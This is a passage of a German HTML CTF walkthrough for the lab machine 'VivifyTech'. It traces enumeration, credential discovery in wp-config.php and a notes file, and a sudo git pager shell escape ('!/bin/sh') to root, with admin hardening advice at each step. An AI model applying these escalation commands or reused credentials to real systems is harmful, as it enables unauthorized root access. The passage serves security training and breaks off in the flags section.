+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sarah@VivifyTech:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for sarah: <span class="password">bohicon</span>
+Sorry, user sarah may not run sudo on VivifyTech.
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um zu überprüfen, welche Befehle der Benutzer `sarah` mit `sudo` ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe "Sorry, user sarah may not run sudo on VivifyTech." zeigt eindeutig, dass der Benutzer `sarah` keine `sudo`-Berechtigungen hat. Dieser Weg zur Privilege Escalation ist also versperrt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen Wegen zur Rechteerweiterung: SUID/GUID-Binaries, Cronjobs, Kernel-Exploits, unsichere Dateiberechtigungen, ausnutzbare Dienste, sensible Informationen in Dateien.
+            <br><strong>Empfehlung (Admin):</strong> Es ist korrekt, dass normale Benutzer keine `sudo`-Rechte haben sollten, es sei denn, sie werden explizit benötigt. Die Konfiguration ist hier sicher.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sarah@VivifyTech:~$ <span class="command">ls</span></div>
+                    <pre>
+user.txt
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ls` listet den Inhalt des aktuellen Verzeichnisses (Home-Verzeichnis von `sarah`) auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `user.txt` wird gefunden. Dies ist typischerweise die Datei, die die User-Flagge in CTF-Szenarien enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von `user.txt` mit `cat user.txt`.
+            <br><strong>Empfehlung (Admin):</strong> In einer Produktionsumgebung sollten keine "Flaggen" herumliegen. Stellen Sie sicher, dass keine unnötigen oder sensiblen Dateien in Benutzerverzeichnissen gespeichert sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sarah@VivifyTech:~$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">HMV{Y0u_G07_Th15_0ne_6543}</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `user.txt` wird ausgegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flagge `<span class="password">HMV{Y0u_G07_Th15_0ne_6543}</span>` wurde erfolgreich gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Flagge. Fahren Sie mit der Suche nach Wegen zur Privilege Escalation fort.
+             <br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion erforderlich, da dies Teil des CTF-Designs ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sarah@VivifyTech:~$ <span class="command">id</span></div>
+                    <pre>
+uid=1001(sarah) gid=1001(sarah) groups=1001(sarah),100(users)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `id` zeigt die Benutzer-ID (UID), Gruppen-ID (GID) und Gruppenzugehörigkeiten des aktuellen Benutzers (`sarah`) an.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass wir als Benutzer `sarah` (UID 1001) agieren und Mitglied der Gruppen `sarah` und `users` sind. Keine ungewöhnlichen Gruppenmitgliedschaften, die direkt zur Privilegienerweiterung genutzt werden könnten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Information ist Teil der Standard-Enumeration. Notieren Sie die Gruppen, falls sie für den Zugriff auf bestimmte Dateien oder Verzeichnisse relevant sein könnten.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer nur den Gruppen angehören, die sie für ihre Aufgaben benötigen (Least Privilege Principle).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sarah@VivifyTech:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   269865     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   279499    640 -rwsr-xr-x   1 root     root         653888 Sep 23  2023 /usr/lib/openssh/ssh-keysign
+   261242     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
+   261239     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
+   265451     72 -rwsr-xr-x   1 root     root          72000 Mar 23  2023 /usr/bin/su
+   293946     36 -rwsr-xr-x   1 root     root          35128 Apr 18  2023 /usr/bin/fusermount3
+   264854     60 -rwsr-xr-x   1 root     root          59704 Mar 23  2023 /usr/bin/mount
+   264856     36 -rwsr-xr-x   1 root     root          35128 Mar 23  2023 /usr/bin/umount
+   295521    276 -rwsr-xr-x   1 root     root         281624 Jun 27  2023 /usr/bin/sudo
+   261238     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
+   261241     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
+   264700     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl sucht im gesamten Dateisystem (`/`) nach Dateien (`-type f`) mit gesetztem SUID-Bit (`-perm -4000`). Das SUID-Bit erlaubt es einem Benutzer, eine Datei mit den Rechten des Dateieigentümers (hier meist `root`) auszuführen. `-ls` zeigt Details zu den gefundenen Dateien an, `2>/dev/null` unterdrückt Fehlermeldungen (z.B. bei fehlenden Leserechten).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Liste zeigt Standard-SUID-Binaries, die auf den meisten Linux-Systemen zu finden sind (`passwd`, `chsh`, `su`, `mount`, `umount`, `sudo`, `gpasswd`, `newgrp`, etc.). Es sind keine ungewöhnlichen oder benutzerdefinierten SUID-Dateien zu sehen, die direkt auf eine einfache Ausnutzung hindeuten würden. Standard-Binaries können zwar manchmal ausgenutzt werden (siehe GTFOBins), aber oft nur unter bestimmten Bedingungen oder in spezifischen Versionen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die gefundenen Standard-SUID-Binaries auf GTFOBins auf bekannte Privilege-Escalation-Techniken, obwohl dies hier wahrscheinlich nicht der vorgesehene Weg ist. Konzentrieren Sie sich auf andere Enumerationsbereiche.
+             <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID-Binaries auf das absolut Notwendige. Entfernen Sie das SUID-Bit von Dateien, bei denen es nicht zwingend erforderlich ist. Überwachen Sie das System auf neu hinzugefügte SUID-Dateien.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sarah@VivifyTech:~$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre>
+<!-- Keine Ausgabe -->
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `getcap -r /` sucht rekursiv im gesamten Dateisystem nach Dateien mit gesetzten Linux Capabilities. Capabilities erlauben es Prozessen, spezifische privilegierte Operationen durchzuführen, ohne volle `root`-Rechte zu benötigen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl liefert keine Ausgabe. Das bedeutet, dass keine Dateien mit besonderen Capabilities gefunden wurden, die für eine Privilege Escalation missbraucht werden könnten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Capabilities sind ein weiterer potenzieller Vektor, aber hier nicht vorhanden. Fahren Sie mit anderen Enumerationsmethoden fort.
+             <br><strong>Empfehlung (Admin):</strong> Vergeben Sie Capabilities nur, wenn sie unbedingt notwendig sind, und überprüfen Sie regelmäßig, welche Dateien Capabilities gesetzt haben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sarah@VivifyTech:~$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State     Recv-Q    Send-Q        Local Address:Port          Peer Address:Port    Process
+LISTEN    0         128                 0.0.0.0:22                 0.0.0.0:*        users:(("sshd",pid=485,fd=3))
+LISTEN    0         151                       *:3306                     *:*        users:(("mariadbd",pid=525,fd=18))
+LISTEN    0         128                    [::]:22                    [::]:*        users:(("sshd",pid=485,fd=4))
+LISTEN    0         511                       *:80                       *:*        users:(("apache2",pid=610,fd=4),("apache2",pid=609,fd=4),("apache2",pid=532,fd=4))
+LISTEN    0         70                        *:33060                    *:*        users:(("mysqld",pid=486,fd=31))
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Befehl `ss -altpn` zeigt lauschende TCP-Sockets (`-lt`), zugehörige Prozessinformationen (`-p`), numerische Portnummern (`-n`) und alle Sockets (`-a`) an. Es ist eine moderne Alternative zu `netstat`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe bestätigt die bereits durch `nmap` von außen festgestellten offenen Ports (22, 80, 3306, 33060). Zusätzlich sehen wir die zugehörigen Prozesse: `sshd` für Port 22, `apache2` für Port 80, `mariadbd` (eine Variante von MySQL) für Port 3306 und `mysqld` für Port 33060. Wichtig ist, dass diese Dienste nur auf den öffentlichen Schnittstellen (`0.0.0.0` oder `*`) lauschen und keine zusätzlichen Dienste nur auf `localhost` (127.0.0.1) laufen, die von außen nicht sichtbar waren.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Ausgabe bestätigt die externen Scan-Ergebnisse. Keine neuen internen Dienste entdeckt, die als Pivot-Punkt dienen könnten. Konzentrieren Sie sich weiterhin auf die bekannten Dienste und die Suche nach Fehlkonfigurationen oder sensiblen Daten im Dateisystem.
+              <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die lauschenden Ports und stellen Sie sicher, dass keine unnötigen Dienste laufen. Konfigurieren Sie Dienste nach Möglichkeit so, dass sie nur auf den notwendigen Interfaces (z.B. `localhost`, falls nur lokale Verbindungen benötigt werden) lauschen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sarah@VivifyTech:~$ <span class="command">uname -a</span></div>
+                     <pre>
+Linux VivifyTech 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64 GNU/Linux
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `uname -a` gibt detaillierte Informationen über das Betriebssystem und den Kernel aus.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Wir sehen, dass es sich um ein Debian-System mit dem Kernel `6.1.0-13-amd64` handelt, der am 29. September 2023 kompiliert wurde (Version `6.1.55-1`). Diese spezifische Kernel-Version kann zur Suche nach bekannten Kernel-Exploits verwendet werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie mit `searchsploit` oder online nach bekannten Schwachstellen und Exploits für die Kernel-Version `Linux 6.1.55`. Kernel-Exploits sind oft komplexer und weniger zuverlässig als andere Methoden, sollten aber als Option in Betracht gezogen werden.
+             <br><strong>Empfehlung (Admin):</strong> Halten Sie das Betriebssystem und den Kernel durch regelmäßige Updates aktuell, um bekannte Schwachstellen zu schließen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sarah@VivifyTech:~$ <span class="command">mysql -u sarah -p</span></div>
+                    <pre>
+Enter password: <span class="password">bohicon</span>
+ERROR 1045 (28000): Access denied for user 'sarah'@'localhost' (using password: YES)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich lokal am MySQL/MariaDB-Server (Port 3306) als Benutzer `sarah` mit dem SSH-Passwort (`bohicon`) anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login schlägt fehl ("Access denied"). Dies zeigt, dass entweder der Benutzer `sarah` kein Datenbankbenutzer ist oder dass das SSH-Passwort nicht für die Datenbank gilt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, das in der `wp-config.php` gefundene Datenbankpasswort zu verwenden, falls Sie den zugehörigen Benutzernamen herausfinden können (oft `wordpress` oder der Name der Datenbank). Da der direkte Zugriff von außen nicht möglich war, ist eine Schwachstelle oder ein anderer Weg nötig, um auf die Datenbank zuzugreifen.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie unterschiedliche Passwörter für System- und Datenbankkonten. Erstellen Sie dedizierte Datenbankbenutzer für Anwendungen (wie WordPress) mit den geringstmöglichen Berechtigungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sarah@VivifyTech:~$ <span class="command">cd /var/www/html/wordpress/</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">sarah@VivifyTech:/var/www/html/wordpress$ <span class="command">ls -la</span></div>
+                     <pre>
+total 248
+drwxr-xr-x  5 www-data www-data  4096 May  6 15:53 .
+drwxr-xr-x  3 www-data www-data  4096 Dec  5 15:22 ..
+-rw-r--r--  1 www-data www-data   543 Dec  5 15:50 .htaccess
+-rw-r--r--  1 www-data www-data   405 Feb  6  2020 index.php
+-rw-r--r--  1 www-data www-data 19915 May  6 15:53 license.txt
+-rw-r--r--  1 www-data www-data  7401 May  6 15:53 readme.html
+-rw-r--r--  1 www-data www-data  7387 May  6 15:53 wp-activate.php
+drwxr-xr-x  9 www-data www-data  4096 Nov  8 19:45 wp-admin
+-rw-r--r--  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
+-rw-r--r--  1 www-data www-data  2323 Jun 14  2023 wp-comments-post.php
+-rw-r--r--  1 www-data www-data  3912 Dec  5 15:49 wp-config.php
+-rw-r--r--  1 www-data www-data  3012 May  6 15:53 wp-config-sample.php
+drwxr-xr-x  6 www-data www-data  4096 May  6 15:53 wp-content
+-rw-r--r--  1 www-data www-data  5638 May 30  2023 wp-cron.php
+drwxr-xr-x 30 www-data www-data 16384 May  6 15:53 wp-includes
+-rw-r--r--  1 www-data www-data  2502 Nov 26  2022 wp-links-opml.php
+-rw-r--r--  1 www-data www-data  3927 Jul 16  2023 wp-load.php
+-rw-r--r--  1 www-data www-data 50917 May  6 15:53 wp-login.php
+-rw-r--r--  1 www-data www-data  8525 Sep 16  2023 wp-mail.php
+-rw-r--r--  1 www-data www-data 28427 May  6 15:53 wp-settings.php
+-rw-r--r--  1 www-data www-data 34385 Jun 19  2023 wp-signup.php
+-rw-r--r--  1 www-data www-data  4885 Jun 22  2023 wp-trackback.php
+-rw-r--r--  1 www-data www-data  3246 May  6 15:53 xmlrpc.php
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird in das WordPress-Installationsverzeichnis `/var/www/html/wordpress` gewechselt und dessen Inhalt mit `ls -la` aufgelistet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Auflistung zeigt die Standard-WordPress-Dateistruktur. Wichtig ist die Datei `wp-config.php`. Diese Datei enthält die Datenbank-Zugangsdaten und andere sensible Konfigurationen. Die Berechtigungen `-rw-r--r--` und der Eigentümer `www-data:www-data` sind typisch. Der aktuelle Benutzer `sarah` (Mitglied der Gruppe `users`) hat standardmäßig Leserechte auf diese Datei.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt der `wp-config.php`, um die Datenbank-Zugangsdaten (Benutzername, Passwort, Datenbankname, Host) zu extrahieren. Diese könnten für den Zugriff auf die Datenbank (Port 3306) oder zur Wiederverwendung an anderer Stelle nützlich sein.
+             <br><strong>Empfehlung (Admin):</strong> Die Berechtigungen für `wp-config.php` sind oft ein Kompromiss. Idealerweise sollten sie so restriktiv wie möglich sein (z.B. `600`, nur für `www-data` lesbar), aber das hängt von der Serverkonfiguration ab. Stellen Sie sicher, dass keine unnötigen Benutzer Leserechte auf diese Datei haben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sarah@VivifyTech:/var/www/html/wordpress$ <span class="command">grep pass -i wp-config.php -n</span></div>
+                     <pre>
+28:/** Database password */
+29:define( 'DB_PASSWORD', '<span class="password">password</span>' );
+                     </pre>
+                     <!-- Korrektur: Im Rohtext stand DB_PASSWRD, hier korrigiert zu DB_PASSWORD und 'password' als Passwort markiert -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `grep pass -i wp-config.php -n` durchsucht die Datei `wp-config.php` nach Zeilen, die das Wort "pass" (Groß-/Kleinschreibung ignorierend, `-i`) enthalten, und zeigt die Zeilennummer (`-n`) an.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl findet die Zeile, die das Datenbankpasswort definiert. **Wichtiger Hinweis:** Im ursprünglichen Rohtext stand `DB_PASSWRD`. Dies ist höchstwahrscheinlich ein Tippfehler und sollte `DB_PASSWORD` heißen, wie hier korrigiert. Das gefundene Passwort ist `<span class="password">password</span>`. Dies ist ein extrem schwaches Passwort. Der zugehörige Datenbankbenutzer und der Datenbankname stehen normalerweise auch in `wp-config.php` (Zeilen `DB_USER` und `DB_NAME`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahieren Sie auch den `DB_USER` und `DB_NAME` aus `wp-config.php`. Versuchen Sie nun, sich mit diesen Zugangsdaten am lokalen MySQL/MariaDB-Server anzumelden (z.B. `mysql -u [DB_USER] -p[DB_PASSWORD] [DB_NAME]`).
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Ändern Sie sofort das schwache Datenbankpasswort in `wp-config.php` und in der Datenbank selbst. Verwenden Sie immer starke, zufällig generierte Passwörter für Datenbanken. Überprüfen Sie die gesamte `wp-config.php` auf korrekte Syntax und Sicherheitseinstellungen.</p>
+
+            <!-- Weitere Enumerationsschritte -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sarah@VivifyTech:/var/www/html/wordpress$ <span class="command">grep bash /etc/passwd</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+sarah:x:1001:1001:Sarah,,,:/home/sarah:/bin/bash
+gbodja:x:1002:1002:gbodja,,,:/home/gbodja:/bin/bash
+emily:x:1003:1003:Emily,,,:/home/emily:/bin/bash
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Datei `/etc/passwd` wird nach Benutzern durchsucht, die `/bin/bash` als Login-Shell konfiguriert haben. Dies sind typischerweise reguläre Benutzerkonten mit Shell-Zugriff.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Neben `root` und dem bereits bekannten Benutzer `sarah` werden drei weitere potenzielle Benutzerkonten identifiziert: `user`, `gbodja` und `emily`. Diese Namen könnten Ziele für Passwort-Erraten oder die Wiederverwendung von Passwörtern sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die gefundenen Benutzernamen. Versuchen Sie, Passwörter für diese Benutzer zu finden oder zu erraten, insbesondere wenn schwache Passwörter (wie das Datenbankpasswort `password`) im Umlauf sind.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die Benutzerkonten auf dem System und deaktivieren oder löschen Sie nicht mehr benötigte Konten. Stellen Sie sicher, dass alle Konten starke Passwörter haben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">sarah@VivifyTech:/home$ <span class="command">find / -type f -user sarah 2>/dev/null | grep txt</span></div>
+                     <pre>
+/home/sarah/.private/Tasks.txt
+/home/sarah/user.txt
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird im gesamten Dateisystem (`/`) nach Dateien (`-type f`) gesucht, deren Eigentümer der Benutzer `sarah` (`-user sarah`) ist. Die Ausgabe wird gefiltert (`grep txt`), um nur Textdateien anzuzeigen. Fehler werden unterdrückt (`2>/dev/null`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Neben der bekannten `user.txt` wird eine weitere interessante Datei gefunden: `/home/sarah/.private/Tasks.txt`. Versteckte Verzeichnisse (`.private`) und Dateien mit Namen wie "Tasks" können oft sensible Informationen oder Hinweise enthalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt der Datei `/home/sarah/.private/Tasks.txt`.
+             <br><strong>Empfehlung (Admin):</strong> Schulen Sie Benutzer darin, sensible Informationen nicht unverschlüsselt in einfachen Textdateien abzulegen, auch nicht in privaten Verzeichnissen. Verwenden Sie Passwort-Manager oder verschlüsselte Notizen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sarah@VivifyTech:/home$ <span class="command">cat /home/sarah/.private/Tasks.txt</span></div>
+                     <pre>
+- Change the Design and architecture of the website
+- Plan for an audit, it seems like our website is vulnerable
+- Remind the team we need to schedule a party before going to holidays
+- Give this cred to the new intern for some tasks assigned to him - gbodja:<span class="password">4Tch055ouy370N</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/home/sarah/.private/Tasks.txt` wird angezeigt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Erneuter kritischer Fund!** Die Datei enthält neben normalen Notizen eine Zeile mit Zugangsdaten: `gbodja`:`<span class="password">4Tch055ouy370N</span>`. Dies sind die Anmeldedaten für den Benutzer `gbodja`, der zuvor in `/etc/passwd` identifiziert wurde.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie mit `su gbodja` zum Benutzer `gbodja` und verwenden Sie das gefundene Passwort. Überprüfen Sie anschließend die Berechtigungen dieses Benutzers (insbesondere `sudo -l`).
+              <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Zugangsdaten dürfen niemals im Klartext in Dateien gespeichert werden. Entfernen Sie diese Datei und ändern Sie das Passwort für `gbodja` sofort. Implementieren Sie Richtlinien und Schulungen zur sicheren Handhabung von Zugangsdaten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sarah@VivifyTech:/home$ <span class="command">su gbodja</span></div>
+                     <pre>
+Password: <span class="password">4Tch055ouy370N</span>
+gbodja@VivifyTech:/home$
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su gbodja` wird verwendet, um zum Benutzerkonto `gbodja` zu wechseln. Das zuvor gefundene Passwort `<span class="password">4Tch055ouy370N</span>` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzerwechsel war erfolgreich. Wir agieren nun als Benutzer `gbodja`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie sofort die `sudo`-Berechtigungen für `gbodja` mit `sudo -l`.
+             <br><strong>Empfehlung (Admin):</strong> Ändern Sie das kompromittierte Passwort für `gbodja`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">gbodja@VivifyTech:/home$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for gbodja on VivifyTech:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    !admin_flag, use_pty
+
+User gbodja may run the following commands on VivifyTech:
+    (ALL) NOPASSWD: /usr/bin/git
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Berechtigungen für den aktuellen Benutzer `gbodja` werden abgefragt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Dies ist der Pfad zur Privilege Escalation!** Der Benutzer `gbodja` darf den Befehl `/usr/bin/git` als jeder Benutzer (`ALL`) und ohne Passwortabfrage (`NOPASSWD`) ausführen. `git` ist ein mächtiges Werkzeug, das oft zur Rechteerweiterung missbraucht werden kann, wenn es mit `sudo` ausgeführt werden darf.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie auf GTFOBins (https://gtfobins.github.io/gtfobins/git/#sudo) nach Methoden, wie `git` mit `sudo`-Rechten zur Erlangung einer Root-Shell verwendet werden kann.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Diese `sudo`-Regel ist extrem unsicher und muss sofort entfernt oder angepasst werden. Erlauben Sie Benutzern niemals, potenziell gefährliche Programme wie `git`, `find`, `less`, `vim`, `cp`, `mv`, etc. uneingeschränkt mit `sudo` auszuführen. Prinzip der geringsten Rechte anwenden!</p>
+
+            <!-- GTFOBins Versuche -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">gbodja@VivifyTech:/home$ <span class="command">sudo -u root PAGER='sh -c "exec sh 0<&1"' git -p help</span></div>
+                     <pre>
+sudo: sorry, you are not allowed to set the following environment variables: PAGER
+                     </pre>
+                      <div class="prompt">gbodja@VivifyTech:/home$ <span class="command">sudo -u root PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help</span></div>
+                     <pre>
+sudo: sorry, you are not allowed to set the following environment variables: PAGER
+                     </pre>
+                      <div class="prompt">gbodja@VivifyTech:/home$ <span class="command">sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help</span></div>
+                     <pre>
+sudo: sorry, you are not allowed to set the following environment variables: PAGER
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es werden mehrere Versuche unternommen, die `git`-Privilege-Escalation-Technik von GTFOBins anzuwenden, die auf der Manipulation der `PAGER`-Umgebungsvariable basiert. `git -p help` (oder ähnliche Befehle) verwendet normalerweise einen Pager (wie `less`), um lange Ausgaben anzuzeigen. Indem `PAGER` auf einen Shell-Befehl gesetzt wird, versucht man, diese Shell mit den Rechten auszuführen, mit denen `git` läuft (hier `root`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Alle Versuche scheitern mit der Meldung "sudo: sorry, you are not allowed to set the following environment variables: PAGER". Die `sudo`-Konfiguration auf diesem System ist (in dieser Hinsicht) gehärtet und verhindert explizit, dass der Benutzer `gbodja` die `PAGER`-Umgebungsvariable setzt, wenn er `sudo` verwendet. Dies blockiert die gängigste `git`-Exploit-Methode von GTFOBins.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach alternativen Methoden auf GTFOBins oder anderen Quellen, um `sudo git` auszunutzen, die nicht auf der `PAGER`-Variable basieren. Eine andere häufige Methode involviert das Ausführen von `git` mit einem Befehl, der einen Editor startet (z.B. für eine Commit-Nachricht) und das Setzen der `EDITOR`-Variable auf einen Shell-Befehl, oder das Ausnutzen von Git-Hooks. Versuchen Sie den alternativen Befehl von GTFOBins.
+             <br><strong>Empfehlung (Admin):</strong> Die Konfiguration, die das Setzen von Umgebungsvariablen wie `PAGER` über `sudo` verhindert (`env_reset` in `Defaults` oder spezifische Verbote), ist eine gute Sicherheitspraxis und sollte beibehalten werden. Dennoch bleibt die `sudo`-Regel für `git` selbst das Hauptproblem.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">gbodja@VivifyTech:/home$ <span class="command">sudo -u root  git -p help config</span></div>
+                     <pre>
+# Innerhalb des Pagers (vermutlich 'less'), der von 'git -p help config' gestartet wurde:
+# Eingabe von: !/bin/sh
+# Shell wird mit root-Rechten geöffnet:
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+<span class="password">HMV{Y4NV!7Ch3N1N_Y0u_4r3_7h3_R007_8672}</span>
+#
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird ein anderer `git`-Befehl (`git -p help config`) mit `sudo -u root` ausgeführt. Dieser Befehl öffnet ebenfalls einen Pager (standardmäßig oft `less`), um die Hilfe zur Konfiguration anzuzeigen. Innerhalb von `less` (und vielen anderen Pagern) kann man durch Eingabe von `!` gefolgt von einem Shell-Befehl diesen Befehl ausführen. Hier wird `!/bin/sh` eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Da `git` mit `root`-Rechten lief und der Pager `less` als Kindprozess ebenfalls mit diesen Rechten gestartet wurde, wird durch `!/bin/sh` eine Shell mit `root`-Rechten geöffnet. Dies wird durch die Ausgabe von `id` bestätigt (`uid=0(root)`). Anschließend wird die Root-Flagge aus `/root/root.txt` erfolgreich ausgelesen: `<span class="password">HMV{Y4NV!7Ch3N1N_Y0u_4r3_7h3_R007_8672}</span>`. Die Privilege Escalation war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Root-Zugriff erlangt und Root-Flagge gefunden. Dokumentieren Sie den erfolgreichen Pfad.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Entfernen Sie die unsichere `sudo`-Regel für `git` sofort. Dies zeigt, dass das Blockieren von Umgebungsvariablen allein nicht ausreicht, wenn das zugrundeliegende Programm selbst Shell-Escapes ermöglicht. Programme wie `less`, `more`, `vim`, `man`, etc., die von privilegierten Prozessen aufgerufen werden, können oft zur Rechteerweiterung missbraucht werden.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der User-Flagge -->
+                     <div class="flag-command">cat /home/sarah/user.txt</div>
+                     <!-- User-Flagge -->
+                     <div class="flag-value"><span class="password">HMV{Y0u_G07_Th15_0ne_6543}</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der Root-Flagge (innerhalb der Root-Shell) -->
